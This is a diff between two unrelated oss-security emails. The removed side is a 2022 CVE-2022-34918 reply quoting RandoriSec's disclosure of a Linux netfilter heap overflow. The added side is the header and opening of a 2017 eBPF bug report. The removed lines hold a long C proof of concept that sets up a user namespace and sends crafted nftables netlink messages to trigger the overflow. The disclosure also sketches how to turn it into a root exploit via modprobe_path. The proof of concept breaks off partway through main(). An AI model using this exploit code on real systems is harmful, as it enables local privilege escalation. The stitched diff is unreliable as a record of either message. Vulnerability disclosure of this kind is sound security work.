@@ -1,4 +1,9 @@
-Received: (qmail 28169 invoked by uid 550); 5 Jul 2022 06:56:42 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["30129" "Thursday" "21" "December" "2017" "19:40:02" "+0100" "Jann Horn" "jannh@google.com" "<CAG48ez35=x3BPJ_sUdxbzjoo+8GLxLGrdhz9r52Y+wqfdbqBUw@mail.gmail.com>" "765" "[oss-security] Linux >=4.9: eBPF memory corruption bugs" "^Date:" nil nil "12" "2017122118:40:02" "[oss-security] Linux >=4.9: eBPF memory corruption bugs" (number mark "        jannh@google Dec 21  765/30129 " thread-indent "\"[oss-security] Linux >=4.9: eBPF memory corruption bugs\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 13469 invoked by uid 550); 21 Dec 2017 18:51:42 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,665 +11,803 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 28151 invoked from network); 5 Jul 2022 06:56:41 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
-	t=1657004190; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
-	 mime-version:mime-version:content-type:content-type:
-	 in-reply-to:in-reply-to:references:references;
-	bh=vCs6+uOX6lwCoMMZeOtJuvwfANMqw9JT6zcFLCEhmD4=;
-	b=b4IKQ+35hqn2r7Mn6kQ5O1KzdeoAlDHdyblcpm/Ddp7Q0cS4GQCo0SHSlBDJryZPD8W55D
-	/3T/L0O2u4P1j5K9jEuiZLvENT/ur1FWnhSkjEaI42SDCaVh7Z3Ydn3ZcMTw5Y5Y/+bXu9
-	6diO+tJCj8PTwXsGLrMzTimdgbSf4q0=
-DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
-	s=susede2_ed25519; t=1657004190;
-	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
-	 mime-version:mime-version:content-type:content-type:
-	 in-reply-to:in-reply-to:references:references;
-	bh=vCs6+uOX6lwCoMMZeOtJuvwfANMqw9JT6zcFLCEhmD4=;
-	b=/UGCTG/KN72o1ze1RWFhPlM++9d/SW6awa5QNOiFqvEbj+jfOUQlqliG1X1/Co8QXnCtJz
-	JGXKG3NBWdhuzLDg==
-Date: Tue, 5 Jul 2022 08:56:28 +0200
-From: Marcus Meissner <meissner@suse.de>
-To: oss-security@lists.openwall.com
-Cc: Hugues ANGUELKOV <hanguelkov@randorisec.fr>
-Message-ID: <20220705065628.GA23475@suse.de>
-References: <20220702193746.GA12948@openwall.com>
+Received: (qmail 7979 invoked from network); 21 Dec 2017 18:40:36 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=google.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=mqDudcfXRXG7yXJx05g9nLzjpJmggdgl+2pcEuj59mw=;
+        b=WHqvkbqpTtR8Wm/ORXcsnuJ1aO6K0XkKl9gE81XTN+fIzxAN5e9Ht22nLO6/0cNL2L
+         z2W4Np89SmiyLKF6yTE0H0+EbRhRBfhuNBgNnpK0Yy24Tzxwe9cX28DRUWR1w+7LBW0k
+         Hf6+6G72TQqdtlNpteGlSmmPA75OUW2jzxX0VtknCdkcZAEkR3A6183SJfoBCZLrGAqQ
+         jT/ZsLq6VIb7HG+MHyjjI1S0uginERcWH8KCubitiNoxY5usTKu3TX3oZo5fnOBsO7ww
+         4OB55bIZE2hGt1vMxRJU2rh8PNgOIsu613aBEYXLgmm5u/0YjRKZe9tBQKLpB5CzqnTO
+         gQuA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=mqDudcfXRXG7yXJx05g9nLzjpJmggdgl+2pcEuj59mw=;
+        b=EI3HksTuGVpSb2Yp31sGqQSvwFBkrjvI7/2UrjaAbx4G4vpSPelZYHWBtB4L6Fr3wM
+         GTZ4ZtGDiI4wZ/85Rl+/JBnHSl2ossHsS+n+aQdrohhwPu3dzZqmCCIRkM9gDpEaktxp
+         fD3viOVMXNM8TfN5e15mVaP5m2x1CibwPndvH+R3+TErmPjP32PzpQv1AqofXP5ZZyPI
+         m+xdNe0TFov5EgdDD9fxRZt9md8sgxRHtwXRfLPW8iEw+r587/ldkgpxrdTrevfp+K+j
+         xFOvJPRp4x3MaJJ0dFL/6SNCrN5Lonsytbt9stL7IqY2s3IGO7tiEjFQN+2dLUkRMGdv
+         Pcxw==
+X-Gm-Message-State: AKGB3mLEg7FF9FotXbOWmiDM/b1+790nkOxZGNemi/DH9iU9Fg2NNvUH
+	UXM8sp+MtEClWkRDKbcWJBemFZf23Z6ceSPtVMqxSIoc6ao=
+X-Google-Smtp-Source: ACJfBosFtPUV4Gjz4UWhFwOsgPtP1Ip+QOIhRzhv9EhqS8Mbhy98+hjirxPGPPTpmI06y+olJxtoumIEHLI/FPNpeOI=
+X-Received: by 10.202.212.83 with SMTP id l80mr8049680oig.85.1513881622825;
+ Thu, 21 Dec 2017 10:40:22 -0800 (PST)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20220702193746.GA12948@openwall.com>
-Organization: SUSE Software Solutions =?iso-8859-1?Q?Ger?=
- =?iso-8859-1?Q?many_GmbH=2C_Frankenstra=DFe_146=2C_90461_Nuernberg=2C_Ger?=
- =?iso-8859-1?Q?many=2C_GF=3A_Ivo_Totev=2C_Andrew_Myers=2C_Andrew_McDonald?=
- =?iso-8859-1?Q?=2C_Martje_Boudien_Moerman=2C_HRB_36809=2C_AG_N=FCrnberg?=
-User-Agent: Mutt/1.10.1 (2018-07-13)
-Subject: Re: [oss-security] Linux kernel: Netfilter heap buffer overflow in
- nft_set_elem_init
+Message-ID: <CAG48ez35=x3BPJ_sUdxbzjoo+8GLxLGrdhz9r52Y+wqfdbqBUw@mail.gmail.com>
+Content-Type: text/plain; charset="UTF-8"
+Date: Thu, 21 Dec 2017 19:40:02 +0100
+From: Jann Horn <jannh@google.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] Linux >=4.9: eBPF memory corruption bugs
+To: oss-security@lists.openwall.com
 
-Hi,
+Hi!
 
-Mitre has assigned CVE-2022-34918 to this issue.
+A few BPF verifier bugs in the Linux kernel, most of which can be used
+for controlled memory corruption, have been fixed over the last days.
+One of the bugs was introduced in 4.9, the others were only introduced
+in 4.14.
 
-Ciao, Marcus
-On Sat, Jul 02, 2022 at 09:37:46PM +0200, Solar Designer wrote:
-> Hi,
-> 
-> The message below was meant to start an embargo for the issue, but it
-> was CC'ed to netfilter-devel, which is a public mailing list, so it also
-> appears here:
-> 
-> https://lore.kernel.org/netfilter-devel/cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr/T/#u
-> 
-> In fact, I am forwarding a copy as downloaded from "lore", but of course
-> it looks identical to what reached linux-distros.
-> 
-> Alexander
-> 
-> ----- Forwarded message from Hugues ANGUELKOV <hanguelkov@randorisec.fr> -----
-> 
-> Date: Fri, 1 Jul 2022 17:43:16 +0200
-> To: linux-distros
-> Cc: security, pablo, kadlec, fw, netfilter-devel, coreteam, davy, amongodin
-> From: Hugues ANGUELKOV <hanguelkov@randorisec.fr>
-> Subject: [vs] Netfilter vulnerability disclosure
-> 
-> Hello everyone,
-> 
-> One of our collaborators at RandoriSec, Arthur Mongodin found a 
-> vulnerability within the netfilter subsystem during his internship.
-> Successful exploitation of this bug leads to a Local Privilege 
-> Escalation (LPE) to the `root` user, as tested on Ubuntu server 22.04 
-> (Linux 5.15.0-39-generic).
-> This vulnerability is a heap buffer overflow due to a weak check and has 
-> been introduced within the commit 
-> [fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81](https://github.com/torvalds/linux/commit/fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81), 
-> it affects the Linux kernel since the version 5.8 and is still present today.
-> 
-> The heap buffer overflow happens in the function `nft_set_elem_init` 
-> (`/net/netfilter/nf_tables_api.c`)
-> 
-> ```c
-> void *nft_set_elem_init(const struct nft_set *set,
-> ??????????? const struct nft_set_ext_tmpl *tmpl,
-> ??????????? const u32 *key, const u32 *key_end,
-> ??????????? const u32 *data, u64 timeout, u64 expiration, gfp_t gfp)
-> {
-> ??? struct nft_set_ext *ext;
-> ??? void *elem;
-> 
-> ??? elem = kzalloc(set->ops->elemsize + tmpl->len, 
-> gfp);??????????????????? <===== (0)
-> ??? if (elem == NULL)
-> ??????? return NULL;
-> 
-> ??? ...
-> 
-> ??? if (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))
-> ??????? memcpy(nft_set_ext_data(ext), data, 
-> set->dlen);???????????????????? <===== (1)
-> 
-> ??? ...
-> 
-> ??? return elem;
-> }
-> ```
-> 
-> A buffer is allocated at (0) without taking in consideration the value 
-> `set->dlen` used at (1) for the copy.
-> The computation of the needed space (`tmpl->len`) is realized before the 
-> call to `nft_set_elem_init`, however,
-> ?a weak check on a user input allows a user to provide an element with 
-> a data length lower than the `set->dlen` for the allocation.
-> This check is located within the function `nft_set_elem_parse_data` 
-> (`/net/netfilter/nf_tables_api.c`).
-> 
-> ```c
-> static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
-> ????????????????? struct nft_data_desc *desc,
-> ????????????????? struct nft_data *data,
-> ????????????????? struct nlattr *attr)
-> {
-> 
-> ??? ...
-> 
-> ??? if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) 
-> {???????? <===== (2)
-> ??????? nft_data_release(data, desc->type);
-> ??????? return -EINVAL;
-> ??? }
-> 
-> ??? return 0;
-> }
-> ```
-> 
-> As we can see at (2), if the data type is `NFT_DATA_VERDICT`, the 
-> comparison between `desc->len` and `set->dlen` is not done.
-> Finally, `desc->len` it is used to compute `tmpl->len` at (0) and 
-> `set->dlen` for the copy at (1) and they can be different.
-> 
-> The vulnerable code path can be reached if the kernel is built with the 
-> configuration `CONFIG_NETFILTER`, `CONFIG_NF_TABLES` enabled.
-> To exploit the vulnerability, an attacker may need to obtain an 
-> unprivileged user namespace to gain the capability `CAP_NET_ADMIN` 
-> (`CONFIG_USER_NS` and `CONFIG_NET_NS` enabled, and 
-> `kernel.unprivileged_userns_clone = 1`).
-> 
-> 
-> The exploitation was simplified by the use of an uninitialized variable 
-> in `nft_add_set_elem`:
-> 
-> ```c
-> static int nft_add_set_elem(struct nft_ctx *ctx, struct nft_set *set, 
-> const struct nlattr *attr, u32 nlmsg_flags)
-> {
-> ? struct nft_set_elem elem;
-> ? ...
-> }
-> ```
-> 
-> First we add an `elem` with the type `NFT_DATA_VALUE`, then `elem.data` 
-> will be filled `set->dlen` bytes, the second iteration will only erase 
-> the first bytes of `elem.data` with an element of type `NFT_DATA_VERDICT`.
-> 
-> We get an infoleak by overwriting the field `datalen` of 
-> an`user_key_payload` structure. The write primitive can be obtained with 
-> an unlinking attack on the `list_head` of the `simple_xattr` structure.
-> We targeted the `modprobe_path` to gain root permission by executing a 
-> shell wrapper.
-> 
-> The following Proof of Concept (PoC) will trigger KASAN on the upstream 
-> kernel (Linux 5.19.0-rc4)
-> 
-> ```c
-> #define _GNU_SOURCE
-> #include <stdio.h>
-> #include <sched.h>
-> #include <stdlib.h>
-> #include <stdint.h>
-> #include <string.h>
-> #include <unistd.h>
-> #include <limits.h>
-> #include <arpa/inet.h>
-> #include <sys/xattr.h>
-> #include <sys/socket.h>
-> #include <linux/netlink.h>
-> #include <linux/netfilter.h>
-> #include <linux/netfilter/nfnetlink.h>
-> #include <linux/netfilter/nf_tables.h>
-> 
-> #define do_error_exit(msg) do {perror("[-] " msg); exit(EXIT_FAILURE); } 
-> while(0)
-> 
-> #define ID 1337
-> #define SET_NAME "name\0\0\0"
-> #define LEAK_SET_NAME "leak\0\0\0"
-> #define TABLE "table\0\0"
-> 
-> #define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
-> #define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
-> #define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
-> #define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
-> #define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)
-> 
-> #define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + 
-> sizeof(struct nlattr) + 8)
-> 
-> #define KMALLOC64_KEYLEN (64 - 8 - 12 - 16) // Max size - elemsize - 
-> sizeof(nft_set_ext)(align) - min datasize
-> 
-> #define BUFFER_SIZE 64
-> 
-> uint8_t buffer[BUFFER_SIZE] = {0};
-> 
-> void new_ns(void) {
-> 
-> ??? if (unshare(CLONE_NEWUSER))
-> ??????? do_error_exit("unshare(CLONE_NEWUSER)");
-> 
-> ??? if (unshare(CLONE_NEWNET))
-> ??????? do_error_exit("unshare(CLONE_NEWNET)");
-> }
-> 
-> struct nlmsghdr *get_batch_begin_nlmsg(void) {
-> 
-> ??? struct nlmsghdr *nlh = (struct nlmsghdr 
-> *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
-> ??? struct nfgenmsg *nfgm = (struct nfgenmsg *)NLMSG_DATA(nlh);
-> 
-> ??? if (!nlh)
-> ??????? do_error_exit("malloc");
-> 
-> ??? memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
-> ??? nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
-> ??? nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
-> ??? nlh->nlmsg_pid = getpid();
-> ??? nlh->nlmsg_flags = 0;
-> ??? nlh->nlmsg_seq = 0;
-> 
-> ??? /* Used to access to the netfilter tables subsystem */
-> ??? nfgm->res_id = NFNL_SUBSYS_NFTABLES;
-> 
-> ??? return nlh;
-> }
-> 
-> struct nlmsghdr *get_batch_end_nlmsg(void) {
-> 
-> ??? struct nlmsghdr *nlh = (struct nlmsghdr 
-> *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
-> 
-> ??? if (!nlh)
-> ??????? do_error_exit("malloc");
-> 
-> ??? memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
-> ??? nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
-> ??? nlh->nlmsg_type = NFNL_MSG_BATCH_END;
-> ??? nlh->nlmsg_pid = getpid();
-> ??? nlh->nlmsg_flags = NLM_F_REQUEST;
-> ??? nlh->nlmsg_seq = 0;
-> 
-> ??? return nlh;
-> }
-> 
-> struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type, 
-> uint16_t data_len) {
-> ??? attr->nla_type = type;
-> ??? attr->nla_len = NLA_ALIGN(data_len + sizeof(struct nlattr));
-> ??? return (void *)attr + sizeof(struct nlattr);
-> }
-> 
-> struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t 
-> value) {
-> ??? attr->nla_type = type;
-> ??? attr->nla_len = U32_NLA_SIZE;
-> ??? *(uint32_t *)NLA_ATTR(attr) = htonl(value);
-> 
-> ??? return (void *)attr + U32_NLA_SIZE;
-> }
-> 
-> struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type, const 
-> char name[8]) {
-> ??? attr->nla_type = type;
-> ??? attr->nla_len = S8_NLA_SIZE;
-> ??? memcpy(NLA_ATTR(attr), name, 8);
-> 
-> ??? return (void *)attr + S8_NLA_SIZE;
-> }
-> 
-> struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type, 
-> uint8_t *buffer, uint64_t buffer_size) {
-> ??? attr->nla_type = type;
-> ??? attr->nla_len = NLA_BIN_SIZE(buffer_size);
-> ??? memcpy(NLA_ATTR(attr), buffer, buffer_size);
-> 
-> ??? return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
-> }
-> void create_table(int sock, const char *name) {
-> ??? struct msghdr msg;
-> ??? struct sockaddr_nl dest_snl;
-> ??? struct iovec iov[3];
-> ??? struct nlmsghdr *nlh_batch_begin;
-> ??? struct nlmsghdr *nlh;
-> ??? struct nlmsghdr *nlh_batch_end;
-> ??? struct nlattr *attr;
-> ??? struct nfgenmsg *nfm;
-> 
-> ??? /* Destination preparation */
-> ??? memset(&dest_snl, 0, sizeof(dest_snl));
-> ??? dest_snl.nl_family = AF_NETLINK;
-> ??? memset(&msg, 0, sizeof(msg));
-> 
-> ??? /* Netlink batch_begin message preparation */
-> ??? nlh_batch_begin = get_batch_begin_nlmsg();
-> 
-> ??? /* Netlink table message preparation */
-> ??? nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
-> ??? if (!nlh)
-> ??????? do_error_exit("malloc");
-> 
-> ??? memset(nlh, 0, TABLEMSG_SIZE);
-> ??? nlh->nlmsg_len = TABLEMSG_SIZE;
-> ??? nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
-> ??? nlh->nlmsg_pid = getpid();
-> ??? nlh->nlmsg_flags = NLM_F_REQUEST;
-> ??? nlh->nlmsg_seq = 0;
-> 
-> ??? nfm = NLMSG_DATA(nlh);
-> ??? nfm->nfgen_family = NFPROTO_INET;
-> 
-> ??? /** Prepare associated attribute **/
-> ??? attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
-> ??? set_str8_attr(attr, NFTA_TABLE_NAME, name);
-> 
-> ??? /* Netlink batch_end message preparation */
-> ??? nlh_batch_end = get_batch_end_nlmsg();
-> 
-> ??? /* IOV preparation */
-> ??? memset(iov, 0, sizeof(struct iovec) * 3);
-> ??? iov[0].iov_base = (void *)nlh_batch_begin;
-> ??? iov[0].iov_len = nlh_batch_begin->nlmsg_len;
-> ??? iov[1].iov_base = (void *)nlh;
-> ??? iov[1].iov_len = nlh->nlmsg_len;
-> ??? iov[2].iov_base = (void *)nlh_batch_end;
-> ??? iov[2].iov_len = nlh_batch_end->nlmsg_len;
-> 
-> ??? /* Message header preparation */
-> ??? msg.msg_name = (void *)&dest_snl;
-> ??? msg.msg_namelen = sizeof(struct sockaddr_nl);
-> ??? msg.msg_iov = iov;
-> ??? msg.msg_iovlen = 3;
-> 
-> ??? sendmsg(sock, &msg, 0);
-> 
-> ??? /* Free used structures */
-> ??? free(nlh_batch_end);
-> ??? free(nlh);
-> ??? free(nlh_batch_begin);
-> }
-> 
-> void create_set(int sock, const char *set_name, uint32_t set_keylen, 
-> uint32_t data_len, const char *table_name, uint32_t id) {
-> ??? struct msghdr msg;
-> ??? struct sockaddr_nl dest_snl;
-> ??? struct nlmsghdr *nlh_batch_begin;
-> ??? struct nlmsghdr *nlh_payload;
-> ??? struct nlmsghdr *nlh_batch_end;
-> ??? struct nfgenmsg *nfm;
-> ??? struct nlattr *attr;
-> ??? uint64_t nlh_payload_size;
-> ??? struct iovec iov[3];
-> 
-> ??? /* Prepare the netlink sockaddr for msg */
-> ??? memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
-> ??? dest_snl.nl_family = AF_NETLINK;
-> 
-> ??? /* First netlink message: batch_begin */
-> ??? nlh_batch_begin = get_batch_begin_nlmsg();
-> 
-> ??? /* Second netlink message : Set attributes */
-> ??? nlh_payload_size = sizeof(struct 
-> nfgenmsg);???????????????????????????????????? // Mandatory
-> ??? nlh_payload_size += 
-> S8_NLA_SIZE;??????????????????????????????????????????????? // 
-> NFTA_SET_TABLE
-> ??? nlh_payload_size += 
-> S8_NLA_SIZE;??????????????????????????????????????????????? // NFTA_SET_NAME
-> ??? nlh_payload_size += 
-> U32_NLA_SIZE;?????????????????????????????????????????????? // NFTA_SET_ID
-> ??? nlh_payload_size += 
-> U32_NLA_SIZE;?????????????????????????????????????????????? // 
-> NFTA_SET_KEY_LEN
-> ??? nlh_payload_size += 
-> U32_NLA_SIZE;?????????????????????????????????????????????? // 
-> NFTA_SET_FLAGS
-> ??? nlh_payload_size += 
-> U32_NLA_SIZE;?????????????????????????????????????????????? // 
-> NFTA_SET_DATA_TYPE
-> ??? nlh_payload_size += 
-> U32_NLA_SIZE;?????????????????????????????????????????????? // 
-> NFTA_SET_DATA_LEN
-> ??? nlh_payload_size = NLMSG_SPACE(nlh_payload_size);
-> 
-> ??? /** Allocation **/
-> ??? nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
-> ??? if (!nlh_payload)
-> ??????? do_error_exit("malloc");
-> 
-> ??? memset(nlh_payload, 0, nlh_payload_size);
-> 
-> ??? /** Fill the required fields **/
-> ??? nlh_payload->nlmsg_len = nlh_payload_size;
-> ??? nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
-> ??? nlh_payload->nlmsg_pid = getpid();
-> ??? nlh_payload->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
-> ??? nlh_payload->nlmsg_seq = 0;
-> 
-> 
-> ??? /** Setup the nfgenmsg **/
-> ??? nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
-> ??? nfm->nfgen_family = 
-> NFPROTO_INET;?????????????????????????????????????????????? // Verify if 
-> it is compulsory
-> 
-> ??? /** Setup the attributes */
-> ??? attr = (struct nlattr *)((void *)nlh_payload + 
-> NLMSG_SPACE(sizeof(struct nfgenmsg)));
-> ??? attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
-> ??? attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
-> ??? attr = set_u32_attr(attr, NFTA_SET_ID, id);
-> ??? attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
-> ??? attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);
-> ??? attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
-> ??? set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);
-> 
-> ??? /* Last netlink message: batch_end */
-> ??? nlh_batch_end = get_batch_end_nlmsg();
-> 
-> ??? /* Setup the iovec */
-> ??? memset(iov, 0, sizeof(struct iovec) * 3);
-> ??? iov[0].iov_base = (void *)nlh_batch_begin;
-> ??? iov[0].iov_len = nlh_batch_begin->nlmsg_len;
-> ??? iov[1].iov_base = (void *)nlh_payload;
-> ??? iov[1].iov_len = nlh_payload->nlmsg_len;
-> ??? iov[2].iov_base = (void *)nlh_batch_end;
-> ??? iov[2].iov_len = nlh_batch_end->nlmsg_len;
-> 
-> ??? /* Prepare the message to send */
-> ??? memset(&msg, 0, sizeof(struct msghdr));
-> ??? msg.msg_name = (void *)&dest_snl;
-> ??? msg.msg_namelen = sizeof(struct sockaddr_nl);
-> ??? msg.msg_iov = iov;
-> ??? msg.msg_iovlen = 3;
-> 
-> ??? /* Send message */
-> ??? sendmsg(sock, &msg, 0);
-> 
-> ??? /* Free allocated memory */
-> ??? free(nlh_batch_end);
-> ??? free(nlh_payload);
-> ??? free(nlh_batch_begin);
-> }
-> 
-> void add_elem_to_set(int sock, const char *set_name, uint32_t 
-> set_keylen, const char *table_name, uint32_t id, uint32_t data_len, 
-> uint8_t *data) {
-> ??? struct msghdr msg;
-> ??? struct sockaddr_nl dest_snl;
-> ??? struct nlmsghdr *nlh_batch_begin;
-> ??? struct nlmsghdr *nlh_payload;
-> ??? struct nlmsghdr *nlh_batch_end;
-> ??? struct nfgenmsg *nfm;
-> ??? struct nlattr *attr;
-> ??? uint64_t nlh_payload_size;
-> ??? uint64_t nested_attr_size;
-> ??? struct iovec iov[3];
-> 
-> ??? /* Prepare the netlink sockaddr for msg */
-> ??? memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
-> ??? dest_snl.nl_family = AF_NETLINK;
-> 
-> ??? /* First netlink message: batch */
-> ??? nlh_batch_begin = get_batch_begin_nlmsg();
-> 
-> ??? /* Second netlink message : Set attributes */
-> 
-> ??? /** Precompute the size of the nested field **/
-> ??? nested_attr_size = 0;
-> 
-> ??? nested_attr_size += sizeof(struct 
-> nlattr);????????????????????????????????????? // Englobing attribute
-> ??? nested_attr_size += sizeof(struct 
-> nlattr);????????????????????????????????????? // NFTA_SET_ELEM_KEY
-> ??? nested_attr_size += 
-> NLA_BIN_SIZE(set_keylen);????????????????????????????????????? // 
-> NFTA_DATA_VALUE
-> ??? nested_attr_size += sizeof(struct 
-> nlattr);????????????????????????????????????? // NFTA_SET_ELEM_DATA
-> ??? nested_attr_size += sizeof(struct 
-> nlattr);????????????????????????????????????? // NFTA_DATA_VERDICT
-> ??? nested_attr_size += 
-> U32_NLA_SIZE;?????????????????????????????????????????????? // 
-> NFTA_VERDICT_CODE
-> 
-> ??? nlh_payload_size = sizeof(struct 
-> nfgenmsg);???????????????????????????????????? // Mandatory
-> ??? nlh_payload_size += sizeof(struct 
-> nlattr);????????????????????????????????????? // NFTA_SET_ELEM_LIST_ELEMENTS
-> ??? nlh_payload_size += 
-> nested_attr_size;?????????????????????????????????????????? // All the 
-> stuff described above
-> ??? nlh_payload_size += 
-> S8_NLA_SIZE;??????????????????????????????????????????????? // 
-> NFTA_SET_ELEM_LIST_TABLE
-> ??? nlh_payload_size += 
-> S8_NLA_SIZE;??????????????????????????????????????????????? // 
-> NFTA_SET_ELEM_LIST_SET
-> ??? nlh_payload_size += 
-> U32_NLA_SIZE;?????????????????????????????????????????????? // 
-> NFTA_SET_ELEM_LIST_SET_ID
-> ??? nlh_payload_size = NLMSG_SPACE(nlh_payload_size);
-> 
-> ??? /** Allocation **/
-> ??? nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
-> ??? if (!nlh_payload) {
-> ??????? do_error_exit("malloc");
-> ??? }
-> ??? memset(nlh_payload, 0, nlh_payload_size);
-> 
-> ??? /** Fill the required fields **/
-> ??? nlh_payload->nlmsg_len = nlh_payload_size;
-> ??? nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | 
-> NFT_MSG_NEWSETELEM;
-> ??? nlh_payload->nlmsg_pid = getpid();
-> ??? nlh_payload->nlmsg_flags = NLM_F_REQUEST;
-> ??? nlh_payload->nlmsg_seq = 0;
-> 
-> ??? /** Setup the nfgenmsg **/
-> ??? nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
-> ??? nfm->nfgen_family = NFPROTO_INET;
-> 
-> ??? /** Setup the attributes */
-> ??? attr = (struct nlattr *)((void *)nlh_payload + 
-> NLMSG_SPACE(sizeof(struct nfgenmsg)));
-> ??? attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
-> ??? attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);
-> ??? attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
-> ??? attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS, 
-> nested_attr_size);
-> 
-> ??? attr = set_nested_attr(attr, 0, nested_attr_size - 4);
-> ??? attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, 
-> NLA_BIN_SIZE(set_keylen));
-> ??? attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)buffer, 
-> set_keylen);
-> ??? attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE + 
-> sizeof(struct nlattr));
-> ??? attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
-> ??? set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);
-> 
-> ??? /* Last netlink message: End of batch */
-> ??? nlh_batch_end = get_batch_end_nlmsg();
-> 
-> ??? /* Setup the iovec */
-> ??? memset(iov, 0, sizeof(struct iovec) * 3);
-> ??? iov[0].iov_base = (void *)nlh_batch_begin;
-> ??? iov[0].iov_len = nlh_batch_begin->nlmsg_len;
-> ??? iov[1].iov_base = (void *)nlh_payload;
-> ??? iov[1].iov_len = nlh_payload->nlmsg_len;
-> ??? iov[2].iov_base = (void *)nlh_batch_end;
-> ??? iov[2].iov_len = nlh_batch_end->nlmsg_len;
-> 
-> ??? /* Prepare the message to send */
-> ??? memset(&msg, 0, sizeof(struct msghdr));
-> ??? msg.msg_name = (void *)&dest_snl;
-> ??? msg.msg_namelen = sizeof(struct sockaddr_nl);
-> ??? msg.msg_iov = iov;
-> ??? msg.msg_iovlen = 3;
-> 
-> ??? /* Send message */
-> ??? sendmsg(sock, &msg, 0);
-> 
-> ??? /* Free allocated memory */
-> ??? free(nlh_batch_end);
-> ??? free(nlh_payload);
-> ??? free(nlh_batch_begin);
-> }
-> 
-> int main(int argc, char **argv) {
-> 
-> ??? int sock;
-> ??? struct sockaddr_nl snl;
-> ??? struct leak *bases;
-> 
-> ??? new_ns();
-> ??? printf("[+] Get CAP_NET_ADMIN capability\n");
-> 
-> ??? /* Netfilter netlink socket creation */
-> ??? if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
-> ??????? do_error_exit("socket");
-> ??? }
-> ??? printf("[+] Netlink socket created\n");
-> 
-> ??? // Binding
-> ??? memset(&snl, 0, sizeof(snl));
-> ??? snl.nl_family = AF_NETLINK;
-> ??? snl.nl_pid = getpid();
-> ??? if (bind(sock, (struct sockaddr *)&snl, sizeof(snl)) < 0) {
